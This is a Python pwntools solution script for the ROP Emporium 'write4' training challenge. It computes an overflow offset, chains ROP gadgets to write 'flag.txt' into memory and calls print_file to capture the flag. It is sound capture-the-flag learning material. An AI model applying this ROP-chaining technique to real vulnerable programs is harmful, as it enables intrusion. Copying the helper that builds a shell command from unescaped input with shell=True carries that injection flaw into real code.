#!/usr/bin/env python3

# ROP Emporium - write4 solution using pwntools library
# Link: https://ropemporium.com/challenge/write4.html
# Created by dilldylanpickle on 5-7-2023
# GitHub: https://github.com/dilldylanpickle
#
# Dependencies:
#   - Python 3.8.10 (https://www.python.org/downloads/release/python-3810/)
#   - Pwntools (https://github.com/Gallopsled/pwntools)
#   - ROPgadget (https://github.com/JonathanSalwan/ROPgadget)

import os           # Provides a way of using operating system dependent functionalities
import re           # Allows pattern matching and text processing through regex
import subprocess   # Allows running of external commands and communication with shell or child processes
from pwn import *   # Import Python3 library for accessing operating system functionality

def exploit(binary_path):

    # Create an ELF object and start a new process
    elf = context.binary = ELF(binary_path)

    # Set log level to debug if debugging is needed
    context.log_level = 'debug'

    # Automatically close the process when the "with" block is exited
    with process(elf.path) as io:

        # Load the cached gadgets for the binary
        rop = ROP(elf)

        # Calculate a valid memory address to store the string in memory
        memory_location = elf.symbols['__data_start']
        log.debug(f"The address of a valid memory location to store the string is {hex(memory_location)}")

        # Use ROPgadget to find the address of a "pop r14 ; pop r15 ; ret" instruction
        pop_gadget = ROP(elf).find_gadget(['pop r14', 'pop r15','ret']).address
        log.debug(f"The address of ROP gadget pop r14 ; pop r15 ; ret is {hex(pop_gadget)}")

        # Use find_gadget to find the address of a "mov qword ptr [r14], r15 ; ret" instruction
        mov_gadget = find_gadget(binary_path, 'mov qword ptr \[r14\], r15 ; ret')
        log.debug(f"The address of ROP gadget mov qword ptr [r14], r15 ; ret is {hex(mov_gadget)}")

        # Use ROPgadget to find the address of a "pop rdi ; ret" instruction
        pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret']).address
        log.debug(f"The address of ROP gadget pop rdi ; ret is {hex(pop_rdi)}")

        # Get the address of the print_file() function
        print_file_addr = elf.plt["print_file"]
        log.debug(f"The address of print_file() is {hex(print_file_addr)}")

        # Get the offset by calling the find_offset() function
        offset = find_offset(binary_path)
        log.debug(f"The offset calculate to overwrite RIP is {offset} bytes")

        # Construct the payload
        payload = b'\x69' * offset
        payload += p64(pop_gadget)
        payload += p64(memory_location)
        payload += b'flag.txt'
        payload += p64(mov_gadget)
        payload += p64(pop_rdi)
        payload += p64(memory_location)
        payload += p64(print_file_addr)

        # Print the payload in hexadecimal representation for debugging purposes
        log.debug("The payload will be " + ''.join('\\x{:02x}'.format(x) for x in payload))

        # Send the payload and print the output
        io.sendline(payload)
        output = io.clean().decode()
        log.info(output)

        # Use regular expression to search for the flag pattern
        flag_pattern = r'ROPE{[^}]+}'
        match = re.search(flag_pattern, output)

        # Verify if the ROP exploit was successful in capturing the flag 
        if match:
            flag = match.group(0)
            log.success(f"(SUCESS) The flag {flag} has been successfully captured!")
        else:
            log.failure("(FAILURE) You failed to capture the flag. Try a new payload!")

def find_offset(binary_path):

    # Save the original log level which would be either 'info' or 'debug'
    log_level = context.log_level

    # Disable logging for offset calculations
    context.log_level = 'error'

    # Record a memory crash in the Core_Dumps subdirectory
    try:

        # Create an ELF object and start a new process
        elf = context.binary = ELF(binary_path)
        
        # Automatically close the process when the "with" block is exited
        with process(elf.path) as io:

            # Send a cyclic pattern as input to the binary
            pattern = cyclic(69)
            io.sendline(pattern)
            io.wait()           

            # Get the corefile to extract the value of the instruction pointer (eip)
            core = io.corefile
            rip = core.rip

            # Find the offset by searching for the cyclic pattern in the eip value
            offset = cyclic_find(core.read(core.rsp, 4))

            # Revert the log level to the original value
            context.log_level = log_level

        # Return the calculated offset to overwrite the instruction pointer
        return offset

    except FileNotFoundError as e:
        log.error(f"Binary not found at {binary_path}")
        raise e

    except PermissionError as e:
        log.error(f"You do not have permission to access {binary_path}")
        raise e

    except ValueError as e:
        log.error(f"Unable to find cyclic pattern in instruction pointer")
        raise e

    except Exception as e:
        log.error(f"An error occurred while finding offset")
        raise e

def find_gadget(binary_path, gadget_pattern):

    # Construct the command to find the ROP gadget using ROPgadget
    cmd = f"ROPgadget --binary {binary_path} | grep '{gadget_pattern}'"

    # Execute the command and store the output
    try:
        output = subprocess.check_output(cmd, shell=True)

    except subprocess.CalledProcessError as e:
        log.error(f"Error executing command: {cmd}")
        raise e

    except Exception as e:
        log.error(f"An error occurred while executing command: {cmd}")
        raise e

    # Output the command for debugging purposes
    log.debug(f"$ {output}")

    # Search the output for the address of the ROP gadget
    try:
        match = re.search(fr'(0x[a-f0-9]+)\s*:\s*{gadget_pattern}', output.decode())

    except re.error as e:
        log.error(f"Invalid regular expression pattern: {gadget_pattern}")
        raise e

    # Output an error if the ROP gadget wasn't in the subprocess output
    if not match:
        raise ValueError(f"No gadget matching pattern {gadget_pattern} found in {binary_path}")

    # Convert the address string to an integer and return it
    return int(match.group(1), 16)

if __name__ == '__main__':

    # Initiate the executables name to declare a valid filesystem path
    binary_path = './write4'
    warnings.filterwarnings("ignore", category=BytesWarning)
    exploit(binary_path)

    # Create a directory called 'core' if it does not already exist
    if not os.path.exists('Core_Dumps'):
        os.makedirs('Core_Dumps')

    # Move all files with the pattern 'core.*' to the 'core' directory
    for filename in os.listdir('.'):
        if filename.startswith('core.'):
            os.rename(filename, os.path.join('Core_Dumps', filename))